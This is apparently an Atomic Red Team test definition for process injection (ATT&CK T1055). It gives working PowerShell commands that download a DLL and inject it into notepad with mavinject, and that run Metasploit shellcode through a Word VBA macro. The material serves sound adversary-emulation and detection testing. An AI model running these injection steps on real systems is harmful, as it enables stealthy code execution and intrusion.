attack_technique: T1055
display_name: Process Injection
atomic_tests:
- name: Process Injection via mavinject.exe
  auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
  description: |
    Windows 10 Utility To Inject DLLS.

    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
    With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
  supported_platforms:
  - windows
  input_arguments:
    process_id:
      description: PID of input_arguments
      type: Integer
      default: (Start-Process notepad -PassThru).id
    dll_payload:
      description: DLL to Inject
      type: Path
      default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Utility to inject must exist on disk at specified location (#{dll_payload})
    prereq_command: |
      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
  executor:
    command: |
      $mypid = #{process_id}
      mavinject $mypid /INJECTRUNNING #{dll_payload}
    name: powershell
    elevation_required: true
- name: Shellcode execution via VBA
  auto_generated_guid: 
  description: |
    This module injects shellcode into a newly created process and executes. By default the shellcode is created,
    with Metasploit, for use on x86-64 Windows 10 machines
  supported_platforms:
  - windows
  input_arguments:
    ms_product:
      description: Maldoc application Word
      type: String
      default: Word
    ms_office_version:
      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
      type: String
      default: $(((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0])
    sub_name:
      description: Name of Sub to execute
      type: String
      default: Execute
    macrocode:
      description: Path to Macrocode to execute
      type: Path
      default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
    prereq_command: |
      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
    get_prereq_command: |
      $xlApp = New-Object -ComObject "Word.Application"
      Stop-Process -Name WORD
  executor:
    command: |
      Import-Module C:\AtomicRedTeam\invoke-atomicredteam\Public\Invoke-MalDoc.ps1  
      Invoke-MalDoc #{macrocode} "#{sub_name}" "#{ms_office_version}" "#{ms_product}"
    cleanup_command: |
      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
    name: powershell